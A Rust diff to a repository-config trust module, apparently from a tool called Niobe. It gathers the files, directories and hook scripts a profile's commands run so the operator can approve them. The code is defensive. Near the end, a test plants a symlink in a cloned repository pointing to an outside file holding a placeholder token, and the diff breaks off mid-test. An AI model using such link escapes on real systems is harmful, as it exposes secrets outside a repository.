@@ -12,6 +12,7 @@
 //! [`niobe_config::trust`]. The record of that decision sits beside the user's
 //! config, which is the one directory a repository cannot write to.
 
+use std::collections::BTreeMap;
 use std::ffi::{OsStr, OsString};
 use std::path::{Path, PathBuf};
 
@@ -83,6 +84,9 @@ pub struct Attached {
 pub enum Contents {
     /// Its text: what the operator is shown, and agrees to by its digest.
     Text(String),
+    /// A directory, by what is under it: what the operator agrees to is that
+    /// it holds these files as they are now.
+    Directory(crate::manifest::Manifest),
     /// Why it cannot be read as text, which leaves it untrusted: a file that
     /// cannot be shown cannot be agreed to.
     Unreadable(String),
@@ -542,50 +546,910 @@ fn root_of(path: &Path) -> PathBuf {
 /// nothing either, and the profile is refused before a backend starts; when it
 /// appears it is a file that was not trusted. A file whose real path is
 /// outside the repository, by `..`, an absolute path or a link, is not read.
+///
+/// A directory an `args` entry or an `env` value names — a plugin directory,
+/// the CLI's own configuration directory, a directory put on `PATH` — is
+/// covered by everything under it, and so is every file a command in a
+/// settings file the profile names runs: its hooks' scripts, its status
+/// line's. A pull can change what either holds without touching the config.
 pub fn attached(config: &Config, root: &Path, home: Option<&OsStr>) -> Vec<Attached> {
-    let real_root = std::fs::canonicalize(root);
-    let contents = |path: &Path| match (std::fs::canonicalize(path), &real_root) {
-        (Ok(real), Ok(root)) if real.starts_with(root) => match niobe_config::read::text(path) {
-            Ok(text) => Contents::Text(text),
-            Err(error) => Contents::Unreadable(error.to_string()),
-        },
-        (Ok(real), Ok(_)) => Contents::Outside(real),
-        (Err(error), _) => Contents::Unreadable(error.to_string()),
-        (_, Err(error)) => Contents::Unreadable(error.to_string()),
-    };
-    let mut files: Vec<Attached> = Vec::new();
-    let mut add = |path: PathBuf, profile: &str, settings: bool| {
-        if !path.is_file() {
-            return;
-        }
-        match files.iter_mut().find(|file| file.path == path) {
-            Some(file) => {
-                file.settings |= settings;
-                if !file.profiles.iter().any(|name| name == profile) {
-                    file.profiles.push(profile.to_owned());
-                }
-            }
-            None => files.push(Attached {
-                text: contents(&path),
-                path,
-                profiles: vec![profile.to_owned()],
-                settings,
-            }),
-        }
+    let mut gather = Gather {
+        root,
+        real_root: std::fs::canonicalize(root),
+        files: Vec::new(),
+        seen: BTreeMap::new(),
+        looked: BTreeMap::new(),
+        budget: crate::manifest::Budget::default(),
+        capped: false,
     };
     for (name, profile) in config.profiles() {
         if let Some(settings) = profile.settings()
             && let Some(written) = expanded(settings, home)
         {
-            add(root.join(written), name, true);
+            gather.add(root.join(written), name, Named::Settings);
         }
         for arg in profile.args() {
             for candidate in path_candidates(arg) {
-                add(root.join(candidate), name, false);
+                gather.add(root.join(candidate), name, Named::Argument);
+            }
+        }
+        // A value is read as words and as a list of paths: `NODE_OPTIONS`
+        // requiring `./x.js` names a file as surely as `PATH` names a
+        // directory.
+        for value in profile.env().values() {
+            for candidate in value
+                .split(|c: char| c == ':' || c.is_whitespace())
+                .flat_map(path_candidates)
+            {
+                gather.add(root.join(candidate), name, Named::Argument);
             }
         }
     }
-    files
+    // Every file named that is JSON is read for the commands the CLI runs
+    // from it — a settings file's hooks and status line, an MCP config's
+    // servers — and so is every JSON file under a directory named, a
+    // plugin's hooks or the CLI's own settings. Each path a command names is
+    // gathered once, listed under the first profile that leads to it: every
+    // file gathered must be agreed to whichever profile lists it, and listing
+    // each under every profile held thousands of copies of thousands of
+    // names. A JSON file that
+    // cannot be read here names commands nobody looked at, which leaves the
+    // config unagreed to rather than agreed to without them.
+    let mut sources: Vec<(Source, String)> = Vec::new();
+    for file in &gather.files {
+        let first = file.profiles.first().cloned().unwrap_or_default();
+        match &file.text {
+            Contents::Text(text) => {
+                sources.push((Source::Text(file.path.clone(), text.clone()), first));
+            }
+            Contents::Directory(manifest) => sources.extend(
+                manifest
+                    .json
+                    .iter()
+                    .map(|path| (Source::File(path.clone()), first.clone())),
+            ),
+            Contents::Outside(_) | Contents::Unreadable(_) => {}
+        }
+    }
+    for (name, profile) in config.profiles() {
+        let held = profile
+            .args()
+            .iter()
+            .flat_map(|arg| path_candidates(arg))
+            .chain(profile.env().values().map(String::as_str));
+        for text in held.filter(|text| text.trim_start().starts_with('{')) {
+            sources.push((Source::Inline(text.to_owned()), name.to_owned()));
+        }
+    }
+    let mut run = Run::default();
+    let root_path = root.to_path_buf();
+    let mut unread: Vec<(PathBuf, String, String)> = Vec::new();
+    for (at, (source, first)) in sources.iter().enumerate() {
+        let (path, text, strict) = match source {
+            Source::Text(path, text) => (path, Ok(text.clone()), is_json(path)),
+            Source::File(path) => (
+                path,
+                gather.json_under(path),
+                path.file_name()
+                    .and_then(OsStr::to_str)
+                    .is_some_and(|name| CLI_READS.contains(&name)),
+            ),
+            Source::Inline(text) => (&root_path, Ok(text.clone()), false),
+        };
+        let first = first.clone();
+        // A byte order mark is not JSON, and is no reason to read none of it.
+        match text.map(|text| {
+            serde_json::from_str::<serde_json::Value>(text.trim_start_matches('\u{feff}'))
+        }) {
+            Ok(Ok(value)) => {
+                if !commands_run(&value, root, at, &mut run) {
+                    gather.too_many(&first);
+                    break;
+                }
+            }
+            Ok(Err(error)) if strict => {
+                unread.push((
+                    path.clone(),
+                    first,
+                    format!("it is not JSON Niobe can read: {error}"),
+                ));
+            }
+            Ok(Err(_)) => {}
+            Err(error) if strict => unread.push((path.clone(), first, error)),
+            Err(_) => {}
+        }
+    }
+    for (path, profile, why) in unread {
+        gather.unreadable(path, &profile, why);
+    }
+    for (path, at) in run.paths {
+        let Some((_, profile)) = sources.get(at) else {
+            continue;
+        };
+        gather.add(path, profile, Named::Command);
+    }
+    gather.files
+}
+
+/// How a profile names a file it hands the CLI.
+#[derive(Clone, Copy)]
+enum Named {
+    /// As its `settings` file.
+    Settings,
+    /// In an `args` entry or an `env` value, which may name a directory.
+    Argument,
+    /// In a command a file it names runs, which names a file: a word of a
+    /// command that names a directory is a directory the command works in
+    /// or on, a build's output among them, and not code it runs.
+    Command,
+}
+
+/// Where the text of a JSON file whose commands are read comes from.
+enum Source {
+    /// A file a profile names, at this path, already read.
+    Text(PathBuf, String),
+    /// A file under a directory a profile names, to be read.
+    File(PathBuf),
+    /// A JSON document an argument or a variable holds whole, such as
+    /// `--settings '{…}'`.
+    Inline(String),
+}
+
+/// Whether the file at `path` is one the CLI reads as JSON, by its name:
+/// another a profile names, such as a prompt, is not JSON and holds no
+/// commands.
+fn is_json(path: &Path) -> bool {
+    path.extension()
+        .is_some_and(|extension| extension == "json")
+}
+
+/// The longest command read for what it runs, in bytes; a config holding a
+/// longer one is not agreed to.
+const LONGEST_COMMAND: usize = 64 * 1024;
+
+/// How many directories deep a path a profile names is looked at, at most.
+const DEEPEST: usize = 128;
+
+/// How many paths the profiles of one config may name and still be agreed
+/// to. A profile names a settings file and a few arguments; a config is a
+/// mebibyte of whatever its clone wrote, and each path is looked at on disk
+/// before the question is asked.
+const CANDIDATES: usize = 4096;
+
+/// The files the profiles of a config name, as they are gathered.
+struct Gather<'a> {
+    root: &'a Path,
+    real_root: std::io::Result<PathBuf>,
+    files: Vec<Attached>,
+    /// Each of `files` by its real path, where it has one: one file named
+    /// under many spellings — `x/../plug`, `x/../x/../plug` — is read once.
+    seen: BTreeMap<PathBuf, usize>,
+    /// Each path named, as it was found on disk the one time it was looked
+    /// at: a word repeated a hundred thousand times is looked at once.
+    looked: BTreeMap<PathBuf, Looked>,
+    /// What is left of what the files and directories named may hold.
+    budget: crate::manifest::Budget,
+    /// Whether more paths were named than one config is agreed to with,
+    /// past which nothing more is looked at.
+    capped: bool,
+}
+
+/// What is at a path a profile names.
+#[derive(Clone)]
+struct Looked {
+    /// Where it really is, where it is anywhere.
+    real: Option<PathBuf>,
+    file: bool,
+    directory: bool,
+}
+
+impl Gather<'_> {
+    /// What is at `path`, looked at once; `None` once more paths have been
+    /// looked at than [`CANDIDATES`].
+    fn look(&mut self, path: &Path) -> Option<Looked> {
+        if let Some(looked) = self.looked.get(path) {
+            return Some(looked.clone());
+        }
+        if self.looked.len() >= CANDIDATES {
+            return None;
+        }
+        // A path deeper than any script costs a walk of every directory in
+        // it to resolve, and is read as naming nothing.
+        if path.components().count() > DEEPEST {
+            return Some(Looked {
+                real: None,
+                file: false,
+                directory: false,
+            });
+        }
+        let metadata = std::fs::metadata(path).ok();
+        let looked = Looked {
+            real: std::fs::canonicalize(path).ok(),
+            file: metadata.as_ref().is_some_and(std::fs::Metadata::is_file),
+            directory: metadata.as_ref().is_some_and(std::fs::Metadata::is_dir),
+        };
+        self.looked.insert(path.to_owned(), looked.clone());
+        Some(looked)
+    }
+
+    /// Adds the file or directory at `path` as one `profile` names, where it
+    /// is one of the kinds `named` can name, and is not the repository itself.
+    /// Past [`CANDIDATES`] paths, the config is marked as one that cannot be
+    /// agreed to.
+    fn add(&mut self, path: PathBuf, profile: &str, named: Named) -> Option<usize> {
+        if self.capped {
+            return None;
+        }
+        let Some(looked) = self.look(&path) else {
+            self.too_many(profile);
+            return None;
+        };
+        let (inside, root) = match (&looked.real, &self.real_root) {
+            (Some(real), Ok(root)) => (real.starts_with(root), real == root),
+            (Some(_) | None, Err(_)) | (None, Ok(_)) => (false, self.root == path),
+        };
+        // A directory outside the repository is the operator's, and is named
+        // in full by the config the operator agrees to, as written.
+        let kind = match named {
+            Named::Settings | Named::Command => looked.file,
+            Named::Argument => looked.file || (looked.directory && inside),
+        };
+        // The repository's root named as a directory the CLI loads from is
+        // everything a pull changes, and cannot be agreed to as it stands; a
+        // command's word naming it, as `cd .` does, names no file it runs.
+        if root && looked.directory && matches!(named, Named::Argument) {
+            self.unreadable(
+                path,
+                profile,
+                "it is the repository's root, which a pull changes whole: name the directory \
+                 the CLI needs, or keep the profile in your own config"
+                    .to_owned(),
+            );
+            return None;
+        }
+        if !kind || root {
+            return None;
+        }
+        let settings = matches!(named, Named::Settings);
+        let key = looked.real.unwrap_or_else(|| path.clone());
+        match self.seen.get(&key).copied() {
+            Some(at) => {
+                let file = self.files.get_mut(at)?;
+                file.settings |= settings;
+                if !file.profiles.iter().any(|name| name == profile) {
+                    file.profiles.push(profile.to_owned());
+                }
+                Some(at)
+            }
+            None => {
+                let text = self.contents(&path);
+                let at = self.files.len();
+                self.seen.insert(key, at);
+                self.files.push(Attached {
+                    text,
+                    path,
+                    profiles: vec![profile.to_owned()],
+                    settings,
+                });
+                Some(at)
+            }
+        }
+    }
+
+    /// The text of the JSON file at `path`, under a directory a profile
+    /// names, read for the commands it holds, where it is in the repository
+    /// and within what is left of the budget.
+    fn json_under(&mut self, path: &Path) -> Result<String, String> {
+        let size = std::fs::metadata(path)
+            .map_err(|error| error.to_string())?
+            .len();
+        self.budget.spend_bytes(size)?;
+        niobe_config::read::text(path).map_err(|error| error.to_string())
+    }
+
+    /// Says, as a file that cannot be read, that `path` names commands
+    /// nobody looked at, which leaves the config untrusted.
+    fn unreadable(&mut self, path: PathBuf, profile: &str, why: String) {
+        if self
+            .files
+            .iter()
+            .any(|file| file.path == path && matches!(file.text, Contents::Unreadable(_)))
+        {
+            return;
+        }
+        self.files.push(Attached {
+            text: Contents::Unreadable(why),
+            path,
+            profiles: vec![profile.to_owned()],
+            settings: false,
+        });
+    }
+
+    /// Says once, as a file that cannot be read, that the config names more
+    /// paths than one is agreed to with, which leaves it untrusted. The root
+    /// stands for the file, since no one path is to blame.
+    fn too_many(&mut self, profile: &str) {
+        if std::mem::replace(&mut self.capped, true) {
+            return;
+        }
+        let root = self.root.to_path_buf();
+        self.files.push(Attached {
+            text: Contents::Unreadable(format!(
+                "the profiles name more than {CANDIDATES} paths, more than a config is agreed \
+                 to with"
+            )),
+            path: root,
+            profiles: vec![profile.to_owned()],
+            settings: false,
+        });
+    }
+
+    fn contents(&mut self, path: &Path) -> Contents {
+        match (std::fs::canonicalize(path), &self.real_root) {
+            (Ok(real), Ok(root)) if real.starts_with(root) && real.is_dir() => {
+                match crate::manifest::of(&real, root, &mut self.budget) {
+                    Ok(manifest) => Contents::Directory(manifest),
+                    Err(error) => Contents::Unreadable(error),
+                }
+            }
+            (Ok(real), Ok(root)) if real.starts_with(root) => {
+                let size = std::fs::metadata(path).map_or(0, |m| m.len());
+                if let Err(error) = self.budget.spend(size) {
+                    return Contents::Unreadable(error);
+                }
+                match niobe_config::read::text(path) {
+                    Ok(text) => Contents::Text(text),
+                    Err(error) => Contents::Unreadable(error.to_string()),
+                }
+            }
+            (Ok(real), Ok(_)) => Contents::Outside(real),
+            (Err(error), _) => Contents::Unreadable(error.to_string()),
+            (_, Err(error)) => Contents::Unreadable(error.to_string()),
+        }
+    }
+}
+
+/// Gathers into `run` what the commands in the JSON `value`, the file at
+/// position `source`, run, where they name it by a path from the
+/// repository's `root`: the files their words name, and those their globs
+/// match. Says `false` once more than [`CANDIDATES`] paths, or [`WORDS`]
+/// words, are named between all the files, past which no more are gathered.
+///
+/// A command is what the CLI runs from such a file: the value of any
+/// `command` — a hook's, the status line's, an MCP server's — the `args` of
+/// an object with a `command`, and the helpers that print a key or headers.
+/// A variable's value is read for the files it names and nothing else, and
+/// the rest of the file — permission rules, models, text — is not a command.
+/// Of a command, what it runs is covered — its program, the script an
+/// interpreter such as `sh` or `node` is handed, the program a wrapper such
+/// as `env` or `timeout` runs — and not the files it reads, writes or
+/// mentions, which change as it works. A command's words are read as a shell
+/// reads them ([`shell_words`]): its
+/// quotes, escapes, continued lines and `$'…'`, and a string handed to
+/// `sh -c` or `eval`; the spellings of the repository's root a hook runs
+/// from — `$CLAUDE_PROJECT_DIR`, `$PWD`, `$(pwd)`, `$(git rev-parse
+/// --show-toplevel)` — are read as the root; a word after a `cd`, `pushd`,
+/// `env -C` or `env --chdir=` is read from the directory it moves to as well
+/// as from the root; and a word holding a glob is every file it matches.
+///
+/// A path a command builds any other way — from a variable of its own, a
+/// loop's, a command's output, a brace, a function or an alias — and a file a script it
+/// runs reads or runs in turn are not covered: no reading of a command's text
+/// finds every file a shell could reach from it, and trusting a config that
+/// hands the CLI scripts is trusting what those scripts do.
+fn commands_run(value: &serde_json::Value, root: &Path, source: usize, run: &mut Run) -> bool {
+    let mut commands = Vec::new();
+    let mut values = Vec::new();
+    commands_in(value, &mut commands, &mut values);
+    let project = root.to_string_lossy();
+    for (command, globs) in commands
+        .into_iter()
+        .map(|command| (command, true))
+        .chain(values.into_iter().map(|value| (value, false)))
+    {
+        // A hook is a line: one of many kilobytes, read with every spelling
+        // of the root in it expanded, grew to megabytes a word at a time.
+        if command.len() > LONGEST_COMMAND {
+            return false;
+        }
+        let mut command = command;
+        for spelling in [
+            "${CLAUDE_PROJECT_DIR}",
+            "$CLAUDE_PROJECT_DIR",
+            "$(git rev-parse --show-toplevel)",
+            "`git rev-parse --show-toplevel`",
+            "$(pwd)",
+            "`pwd`",
+            "${PWD}",
+            "$PWD",
+        ] {
+            command = command.replace(spelling, &project);
+        }
+        // A command is read as a shell reads its words; a variable's value
+        // as the list of paths it may be.
+        let words: Vec<String> = match globs {
+            true => shell_words(&command),
+            false => command
+                .split(|c: char| c == ':' || c.is_ascii_whitespace())
+                .filter(|word| !word.is_empty())
+                .map(str::to_owned)
+                .collect(),
+        };
+        let mut base: Option<PathBuf> = None;
+        let mut after_cd = false;
+        // Whether the next word is what a redirection names, and whether the
+        // words up to the next command are what a `tee` writes.
+        let mut redirected = false;
+        let mut teeing = false;
+        let mut at = Position::Program;
+        let mut before: &str = "";
+        for word in &words {
+            let word = word.as_str();
+            let previous = std::mem::replace(&mut before, word);
+            // An option before a `cd`'s directory, `-P` or `--`, leaves the
+            // directory still to come.
+            match word {
+                REDIRECT => {
+                    redirected = true;
+                    continue;
+                }
+                SEPARATOR => {
+                    teeing = false;
+                    after_cd = false;
+                    at = Position::Program;
+                    continue;
+                }
+                "tee" => {
+                    teeing = true;
+                    continue;
+                }
+                _ if std::mem::take(&mut redirected) || teeing => continue,
+                _ => {}
+            }
+            if word.is_empty() || (after_cd && word.starts_with('-')) {
+                continue;
+            }
+            if let Some(dir) = word.strip_prefix("--chdir=") {
+                let moved = base.as_deref().unwrap_or(root).join(dir);
+                if moved.as_os_str().len() <= LONGEST_CD {
+                    base = Some(moved);
+                }
+                continue;
+            }
+            run.words = run.words.saturating_add(1);
+            if run.words > WORDS {
+                return false;
+            }
+            if after_cd {
+                let moved = base.as_deref().unwrap_or(root).join(word);
+                if moved.as_os_str().len() <= LONGEST_CD {
+                    base = Some(moved);
+                }
+                after_cd = false;
+                continue;
+            }
+            // `cd`, `pushd` and `env -C` each move where the words after
+            // them are read from.
+            after_cd = matches!(word, "cd" | "pushd") || (word == "-C" && previous == "env");
+            // Of a command, only what it runs is covered — its program, the
+            // script an interpreter is handed, the program a wrapper runs —
+            // and not the files it reads or mentions, which change as it
+            // works. A variable's value is a list of paths, every one read.
+            if globs {
+                let (runs, next) = at.read(word);
+                at = next;
+                if !runs {
+                    continue;
+                }
+            }
+            for candidate in path_candidates(word) {
+                // A word longer than any path names no file, and a glob in
+                // one is not expanded: each of its components was pushed
+                // onto every match.
+                if candidate.len() > LONGEST_PATH {
+                    continue;
+                }
+                for from in std::iter::once(root).chain(base.as_deref()) {
+                    let joined = from.join(candidate);
+                    let named = match candidate.contains(['*', '?', '[']) {
+                        true if !globs => continue,
+                        true => match globbed(&joined, &mut run.globbed) {
+                            Some(named) => named,
+                            None => return false,
+                        },
+                        false => vec![joined],
+                    };
+                    for named in named {
+                        if named.as_os_str().len() > LONGEST_PATH {
+                            continue;
+                        }
+                        if !run.paths.contains_key(&named) && run.paths.len() >= CANDIDATES {
+                            return false;
+                        }
+                        run.paths.entry(named).or_insert(source);
+                    }
+                }
+            }
+        }
+    }
+    true
+}
+
+/// The words of the shell command `command` as a shell reads them: split at
+/// unquoted blanks and the characters that end a command or start a
+/// redirection, with the quotes and escapes that hold a word together taken
+/// out, a line continued with a backslash joined, and `$'…'` decoded. A
+/// no-break space or a colon is part of a word, as it is to a shell. A
+/// string handed to `sh -c` or to `eval` is a command of its own, whose
+/// words follow it, two deep.
+/// Where a word stands in a command, for whether it is what the command
+/// runs.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum Position {
+    /// Where the program comes, past assignments, keywords and wrappers.
+    Program,
+    /// After an interpreter, where the script it runs comes, past options.
+    Script,
+    /// After what the command runs: its arguments.
+    Arguments,
+}
+
+impl Position {
+    /// Whether `word`, standing here, is what its command runs, and where
+    /// the word after it stands.
+    fn read(self, word: &str) -> (bool, Self) {
+        const KEYWORDS: [&str; 13] = [
+            "if", "then", "else", "elif", "do", "while", "until", "!", "{", "time", "fi", "done",
+            "}",
+        ];
+        const WRAPPERS: [&str; 11] = [
+            "env",
+            "exec",
+            "nohup",
+            "timeout",
+            "xargs",
+            "sudo",
+            "command",
+            "builtin",
+            "nice",
+            "stdbuf",
+            "caffeinate",
+        ];
+        const INTERPRETERS: [&str; 19] = [
+            "sh", "bash", "zsh", "dash", "ksh", "fish", "python", "python3", "node", "nodejs",
+            "deno", "bun", "ruby", "perl", "php", "lua", "tsx", "source", ".",
+        ];
+        let assignment = word.split_once('=').is_some_and(|(name, _)| {
+            !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+        });
+        match self {
+            Self::Program if assignment || KEYWORDS.contains(&word) || WRAPPERS.contains(&word) => {
+                (false, Self::Program)
+            }
+            // A wrapper's options and figures: `timeout 10`, `nice -n 5`.
+            Self::Program if word.starts_with('-') || word.parse::<f64>().is_ok() => {
+                (false, Self::Program)
+            }
+            Self::Program if INTERPRETERS.contains(&word) => (false, Self::Script),
+            Self::Program => (true, Self::Arguments),
+            Self::Script if word.starts_with('-') => (false, Self::Script),
+            Self::Script => (true, Self::Arguments),
+            Self::Arguments => (false, Self::Arguments),
+        }
+    }
+}
+
+/// The word [`split_words`] puts where output was redirected.
+const REDIRECT: &str = ">";
+
+/// The word [`split_words`] puts where a command ended.
+const SEPARATOR: &str = ";";
+
+fn shell_words(command: &str) -> Vec<String> {
+    nested_words(command, 0)
+}
+
+fn nested_words(command: &str, depth: usize) -> Vec<String> {
+    let mut words: Vec<String> = Vec::new();
+    for word in split_words(command) {
+        let nested = depth < 2 && words.last().is_some_and(|last| runs_next(last.as_str()));
+        let inner = nested.then(|| nested_words(&word, depth + 1));
+        words.push(word);
+        if let Some(inner) = inner {
+            words.push(SEPARATOR.to_owned());
+            words.extend(inner);
+        }
+    }
+    words
+}
+
+/// Whether the word `word` makes the next one a command of its own: `eval`,
+/// or a shell's `-c` alone or among other one-letter flags, as `-lc` is.
+fn runs_next(word: &str) -> bool {
+    word == "eval"
+        || word.strip_prefix('-').is_some_and(|flags| {
+            !flags.starts_with('-')
+                && flags.contains('c')
+                && flags.chars().all(|c| c.is_ascii_alphabetic())
+        })
+}
+
+fn split_words(command: &str) -> Vec<String> {
+    let mut words = Vec::new();
+    let mut word = String::new();
+    // The quote a word is inside, where it is: `'`, `"`, or `$` for `$'…'`.
+    let mut quote: Option<char> = None;
+    let mut chars = command.chars().peekable();
+    while let Some(c) = chars.next() {
+        match (quote, c) {
+            (Some('$'), '\'') => quote = None,
+            (Some(q), c) if q != '$' && c == q => quote = None,
+            (Some('$'), '\\') => match chars.next() {
+                Some('n') => word.push('\n'),
+                Some('t') => word.push('\t'),
+                Some(escaped) => word.push(escaped),
+                None => {}
+            },
+            (Some('"') | None, '\\') => match chars.next() {
+                // A backslash before a line break continues the line.
+                Some('\n') | None => {}
+                Some(escaped) => word.push(escaped),
+            },
+            (Some(_), c) => word.push(c),
+            (None, '$') if chars.peek() == Some(&'\'') => {
+                chars.next();
+                quote = Some('$');
+            }
+            (None, '"' | '\'') => quote = Some(c),
+            (None, c) if c.is_ascii_whitespace() || ";|&()<>`".contains(c) => {
+                if !word.is_empty() {
+                    words.push(std::mem::take(&mut word));
+                }
+                // A redirection names what the command writes or reads, and a
+                // separator ends a command: each is kept as a word of its own
+                // that no path is, once however many characters spell it.
+                // What `<` names is what the command reads, which `sh < x.sh`
+                // runs, so only what `>` names is left out.
+                let marker = match c {
+                    '>' => Some(REDIRECT),
+                    ';' | '|' | '&' | '\n' => Some(SEPARATOR),
+                    _ => None,
+                };
+                if let Some(marker) = marker
+                    && words.last().map(String::as_str) != Some(marker)
+                {
+                    words.push(marker.to_owned());
+                }
+            }
+            (None, c) => word.push(c),
+        }
+    }
+    if !word.is_empty() {
+        words.push(word);
+    }
+    words
+}
+
+/// `word` quoted for a shell, as one word whatever it holds.
+fn quoted(word: &str) -> String {
+    format!("'{}'", word.replace('\'', "'\\''"))
+}
+
+/// The strings of `value` the CLI runs as commands, into `commands`, and the
+/// values of the variables it sets, into `values`.
+fn commands_in(value: &serde_json::Value, commands: &mut Vec<String>, values: &mut Vec<String>) {
+    use serde_json::Value;
+
+    const HELPERS: [&str; 7] = [
+        "apiKeyHelper",
+        "awsAuthRefresh",
+        "awsCredentialExport",
+        "gcpAuthRefresh",
+        "headersHelper",
+        "otelHeadersHelper",
+        "proxyAuthHelper",
+    ];
+    match value {
+        Value::Object(map) => {
+            let has_command = map.contains_key("command");
+            let args = map.get("args").and_then(Value::as_array);
+            for (key, value) in map {
+                match (key.as_str(), value) {
+                    // An MCP server's program and its arguments are one
+                    // command line, each word as written.
+                    ("command", Value::String(command)) if args.is_some() => {
+                        let mut line = quoted(command);
+                        for arg in args.into_iter().flatten().filter_map(Value::as_str) {
+                            line.push(' ');
+                            line.push_str(&quoted(arg));
+                        }
+                        commands.push(line);
+                    }
+                    ("command", Value::String(command)) => commands.push(command.clone()),
+                    (key, Value::String(command)) if HELPERS.contains(&key) => {
+                        commands.push(command.clone());
+                    }
+                    ("args", Value::Array(_)) if has_command => {}
+                    ("env", Value::Object(env)) => {
+                        values.extend(env.values().filter_map(Value::as_str).map(str::to_owned))
+                    }
+                    (_, value) => commands_in(value, commands, values),
+                }
+            }
+        }
+        Value::Array(items) => {
+            for item in items {
+                commands_in(item, commands, values);
+            }
+        }
+        Value::Null | Value::Bool(_) | Value::Number(_) | Value::String(_) => {}
+    }
+}
+
+/// The longest path a file can be opened by, in bytes: one longer names no
+/// file, and is not gathered. `PATH_MAX` on Linux; macOS's is shorter.
+const LONGEST_PATH: usize = 4096;
+
+/// The longest directory a command's `cd`s are followed to, in bytes. Every
+/// word after them is read from there, and a hook that moves to a directory
+/// a kilobyte deep was not written to run anything.
+const LONGEST_CD: usize = 512;
+
+/// The JSON files the CLI reads commands from, by name: a plugin's manifest,
+/// hooks and servers, and the CLI's own settings. One of these under a
+/// directory a profile names that cannot be read leaves the config
+/// untrusted; any other JSON there — a lockfile, a `tsconfig.json` with
+/// comments — is agreed to by its bytes, and read for commands only where it
+/// reads.
+const CLI_READS: [&str; 5] = [
+    "hooks.json",
+    "plugin.json",
+    ".mcp.json",
+    "settings.json",
+    "settings.local.json",
+];
+
+/// What the commands of the files read run: each path, and the first of the
+/// files read whose commands name it, by its place among them; and how many
+/// words they held between them.
+#[derive(Default)]
+struct Run {
+    paths: BTreeMap<PathBuf, usize>,
+    words: usize,
+    /// How many directory entries their globs have looked at between them.
+    globbed: usize,
+}
+
+/// How many words the commands of the files one config names may hold
+/// between them, past which the config is not agreed to. A hook is a line;
+/// a mebibyte of words in each of a hundred files was minutes before the
+/// question was asked.
+const WORDS: usize = 200_000;
+
+/// How many files one glob is read as matching, at most.
+const GLOBBED: usize = 256;
+
+/// How many directory entries the globs of one config may look at between
+/// them, past which the config is not agreed to. A hook's glob lists a
+/// directory of scripts; a few kilobytes of `*/*/*` listed for minutes.
+const GLOB_WORK: usize = 50_000;
+
+/// The longest file name, in bytes: a glob component longer matches none.
+const LONGEST_NAME: usize = 255;
+
+/// The files the glob `pattern` matches on disk, a component at a time, as
+/// a shell would expand it: `*` and `?` match within one name, a class
+/// `[…]` matches any one character, and a name opening with `.` matches only
+/// a pattern that does. A pattern matching nothing is read as written, so
+/// a file that appears to match it later is one nobody agreed to.
+///
+/// Each entry looked at is counted into `work`; `None` once it passes
+/// [`GLOB_WORK`].
+fn globbed(pattern: &Path, work: &mut usize) -> Option<Vec<PathBuf>> {
+    let mut matched = vec![PathBuf::new()];
+    for component in pattern.components() {
+        let part = component.as_os_str();
+        let Some(glob) = part.to_str().filter(|part| part.contains(['*', '?', '['])) else {
+            for path in &mut matched {
+                path.push(part);
+            }
+            continue;
+        };
+        if glob.len() > LONGEST_NAME {
+            matched.clear();
+            break;
+        }
+        let compiled = compiled(glob);
+        let mut next = Vec::new();
+        for dir in &matched {
+            let Ok(entries) = std::fs::read_dir(dir) else {
+                continue;
+            };
+            let mut names = Vec::new();
+            for entry in entries.flatten() {
+                *work = work.saturating_add(1);
+                if *work > GLOB_WORK {
+                    return None;
+                }
+                if let Ok(name) = entry.file_name().into_string()
+                    && matches_glob(&compiled, glob, &name)
+                {
+                    names.push(name);
+                }
+            }
+            names.sort();
+            for name in names {
+                if next.len() >= GLOBBED {
+                    break;
+                }
+                next.push(dir.join(name));
+            }
+        }
+        matched = next;
+    }
+    Some(match matched.is_empty() {
+        true => vec![pattern.to_owned()],
+        false => matched,
+    })
+}
+
+/// The one-component glob `glob` as the characters [`matches_glob`] matches
+/// against, a class read as any one character: matching too much covers
+/// more, which only asks again more often.
+fn compiled(glob: &str) -> Vec<char> {
+    let mut pattern = Vec::new();
+    let mut chars = glob.chars();
+    while let Some(c) = chars.next() {
+        match c {
+            '[' => {
+                for c in chars.by_ref() {
+                    if c == ']' {
+                        break;
+                    }
+                }
+                pattern.push('?');
+            }
+            c => pattern.push(c),
+        }
+    }
+    pattern
+}
+
+/// Whether the file name `name` matches `pattern`, the glob `glob`
+/// [`compiled`].
+fn matches_glob(pattern: &[char], glob: &str, name: &str) -> bool {
+    if name.starts_with('.') && !glob.starts_with('.') {
+        return false;
+    }
+    let name: Vec<char> = name.chars().collect();
+    // The classic two-pointer match, with the last `*` to fall back to.
+    let (mut p, mut n, mut star, mut mark) = (0, 0, None, 0);
+    while n < name.len() {
+        match pattern.get(p) {
+            Some('*') => {
+                star = Some(p);
+                mark = n;
+                p += 1;
+            }
+            Some(&c) if c == '?' || name.get(n) == Some(&c) => {
+                p += 1;
+                n += 1;
+            }
+            _ => match star {
+                Some(at) => {
+                    p = at + 1;
+                    mark += 1;
+                    n = mark;
+                }
+                None => return false,
+            },
+        }
+    }
+    pattern
+        .get(p..)
+        .unwrap_or_default()
+        .iter()
+        .all(|c| *c == '*')
 }
 
 /// Whether the repository config at `path`, holding `text`, and the files it
@@ -620,6 +1484,9 @@ fn trusted(
         && names_agreed
         && attached.iter().all(|file| match &file.text {
             Contents::Text(text) => record.trusts(&attached_key(&file.path), text),
+            Contents::Directory(manifest) => {
+                record.trusts(&attached_key(&file.path), &manifest.text)
+            }
             Contents::Outside(real) => {
                 record.trusts(&attached_key(&file.path), &real.to_string_lossy())
             }
@@ -639,6 +1506,7 @@ pub fn record_trust(record: &Path, untrusted: &Untrusted) -> Result<(), String> 
     for file in &untrusted.attached {
         match &file.text {
             Contents::Text(text) => files.push((&file.path, text.clone())),
+            Contents::Directory(manifest) => files.push((&file.path, manifest.text.clone())),
             Contents::Outside(real) => {
                 files.push((&file.path, real.to_string_lossy().into_owned()));
             }
@@ -1363,19 +2231,27 @@ mod tests {
              args = [\"--mcp-config\", \"{0}\", \"--x=linked.json\"]\n",
             secret.display()
         ));
-        std::os::unix::fs::symlink(&secret, clone.dir.path().join("linked.json"))
+        let other = elsewhere.path().join("other.json");
+        std::fs::write(&other, r#"{"token":"SECRET"}"#)
+            .expect("the temporary directory is writable");
+        std::os::unix::fs::symlink(&other, clone.dir.path().join("linked.json"))
             .expect("the temporary directory is writable");
 
         let loaded = clone.load();
         let untrusted = loaded.untrusted.expect("the config is asked about");
 
-        assert_eq!(untrusted.attached.len(), 2, "{:?}", untrusted.attached);
